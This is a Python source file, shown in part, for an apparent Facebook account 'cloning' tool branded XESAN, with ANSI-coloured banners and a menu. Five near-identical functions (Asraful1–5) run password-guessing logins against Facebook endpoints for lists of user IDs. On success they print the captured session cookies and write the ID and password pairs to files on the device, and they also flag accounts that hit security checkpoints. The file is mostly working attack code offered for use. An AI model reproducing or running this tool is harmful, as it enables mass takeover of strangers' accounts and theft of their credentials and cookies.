#•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••#
#Sc Make By NAYIMUR RAHMAN DURJOY
#Gift By XESAN & DURJOY
#Github XESAN-VAU
#•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••#
#••••••••••••••••••••••••IMPORT MODULE•••••••••••••••••••••••#
#•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••#
...
logo =("""
 ...
 \033[1;97m╚══════════════════════════════════════╝
 \033[1;97m╔══════════════════════════════════════╗   
 \033[1;97m║\033[1;95mOwner \033[1;90m<\033[1;92m•\033[1;90m> \033[1;93mNAYIMUR RAHMAN DURJOY \033[1;90m<\033[1;92m•\033[1;90m] \033[1;95m.1\033[1;97m║
 \033[1;97m╚══════════════════════════════════════╝
                         """) 
cloninglogo =("""
\033[1;97m ╔══════════════════════════════════════╗   
...
\033[1;97m ╔══════════════════════════════════════╗   
 ...
 \033[1;97m╚══════════════════════════════════════╝
 \033[1;97m╔══════════════════════════════════════╗   
 \033[1;97m║   \033[1;95m Owner \033[1;90m<\033[1;92m•\033[1;90m> \033[1;93mNAYIMUR RAHMAN DURJOY   \033[1;97m║
 \033[1;97m╚══════════════════════════════════════╝
                         """)
def Cloning_Linex():
...
#•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••#
def Nodi_Hasan():
	#os.system('xdg-open https://www.facebook.com/NAYIMUR.RAHMAN.DURJOY.OFFICIAL')
    os.system('clear');print(logo);print("  \033[1;35m[\033[1;32m1\033[1;35m]\033[1;32m BD RANDOM \033[1;35m[\033[1;32m2\033[1;35m]\033[1;32m XESAN'S CONTACT INFO \033[1;35m[\033[1;32m0\033[1;35m]\033[1;32m EXIT");Al_Hasan();Tahrima = input(f'  \033[1;91m[\033[1;97m?\033[1;91m]\033[1;32m CHOICE YOUR OPTION :\033[1;36m ')
    if Tahrima in ["1","A","a"]:
        Nodi()
    if Tahrima in ["2","B","b"]:
        Contact()
    if Tahrima in ["0","E","e"]:
        exit('  \033[1;35m[\033[1;32m✓\033[1;35m]\033[1;32m THANKS FOR USING MY TOOLS😊🌻')
    else:
...
def Contact():
	...
	if Tymin in ['1']:
		os.system('xdg-open https://www.facebook.com/NAYIMUR.RAHMAN.DURJOY.OFFICIAL')
	if Tymin in ['2']:
		os.system('xdg-open https://www.facebook.com/XESAN.VAU')
	if Tymin in ['3']:
	...
	if Tymin in ['8']:
		os.system('xdg-open https://github.com/XESAN-VAU')
	if Tymin in ['9']:
		Nodi_Hasan()
	if Tymin in ['0']:
		exit('  \033[1;35m[\033[1;32m1 ✓\033[1;35m]\033[1;32m THANKS FOR USING MY TOOLS😊🌻')
	else:
...
def Asraful1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r  \033[1;91m[\033[1;92mXESAN-M1\033[1;91m]<>[\033[1;92m%s\033[1;91m]<>[\033[1;92mOK-%s\033[1;91m]\r'%(loop,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f'  \033[1;96m[\033[1;92mXESAN-OK💚\033[1;96m]\033[1;92m '+uid+' \033[1;96m|\033[1;92m '+ps+'');print(f'  \033[1;32mCOOKIE🌻 : \033[1;32m'+coki);open('/sdcard/XESAN-OK-M1.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('  \033[1;90m[XESAN-CP💔] '+uid+' | '+ps+' \n');open('/sdcard/XESAN-CP-M1.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
...
def Asraful2(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            session = requests.Session()
            sys.stdout.write(f'\r  \033[1;91m[\033[1;92mXESAN-M2\033[1;91m]<>[\033[1;92m%s\033[1;91m]<>[\033[1;92mOK-%s\033[1;91m]\r'%(loop,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f'  \033[1;96m[\033[1;92mXESAN-OK💚\033[1;96m]\033[1;93m '+uid+' \033[1;96m|\033[1;92m '+ps+'');print(f'  \033[1;32mCOOKIE🌻 : \033[1;91m'+coki);open('/sdcard/XESAN-OK-M2.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                #print('  \033[1;90m[XESAN-CP💔] '+uid+' | '+ps+' \n');open('/sdcard/XESAN-CP-M2.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
...
def Asraful3(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            session = requests.Session()
            sys.stdout.write(f'\r  \033[1;91m[\033[1;92mXESAN-M3\033[1;91m]<>[\033[1;92m%s\033[1;91m]<>[\033[1;92mOK-%s\033[1;91m]\r'%(loop,len(oks))),
            sys.stdout.flush()
            hasanasha = random.choice(ugen)
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f'  \033[1;96m[\033[1;92mXESAN-OK💚\033[1;96m]\033[1;97m '+uid+' \033[1;96m|\033[1;92m '+ps+'');print(f'  \033[1;93mCOOKIE🌻 : \033[1;95m'+coki);open('/sdcard/XESAN-OK-M3.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                #print('  \033[1;90m[XESAN-CP💔] '+uid+' | '+ps+' \n');open('/sdcard/XESAN-CP-M3.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
...
def Asraful4(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            session = requests.Session()
            sys.stdout.write(f'\r  \033[1;91m[\033[1;92mXESAN-M4\033[1;91m]<>[\033[1;92m%s\033[1;91m]<>[\033[1;92mOK-%s\033[1;91m]\r'%(loop,len(oks))),
            sys.stdout.flush()
            hasanasha = random.choice(ugen)
            free_fb = session.get('https://p.facebook.com').text
            log_data = {
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f'  \033[1;96m[\033[1;92mXESAN-OKK💚\033[1;96m]\033[1;92m '+uid+' \033[1;96m|\033[1;92m '+ps+'');open('/sdcard/XESAN-OK-M4.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                #print('  \033[1;90m[XESAN-CP💔] '+uid+' | '+ps+' \n');open('/sdcard/XESAN-CP-M4.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
...
def Asraful5(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            session = requests.Session()
            sys.stdout.write(f'\r  \033[1;91m[\033[1;92mXESAN-M5\033[1;91m]<>[\033[1;92m%s\033[1;91m]<>[\033[1;92mOK-%s\033[1;91m]\r'%(loop,len(oks))),
            sys.stdout.flush()
            ashahasan = random.choice(bangla)
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f'  \033[1;96m[\033[1;92mXESAN-OK💚\033[1;96m]\033[1;92m '+uid+' \033[1;96m|\033[1;92m '+ps+'');print(f'  \033[1;32mCOOKIE🌻 : \033[1;97m'+coki);open('/sdcard/XESAN-OK-M5.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                #print('  \033[1;90m[XESAN-CP💔] '+uid+' | '+ps+' \n')open('/sdcard/XESAN-CP-M5.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
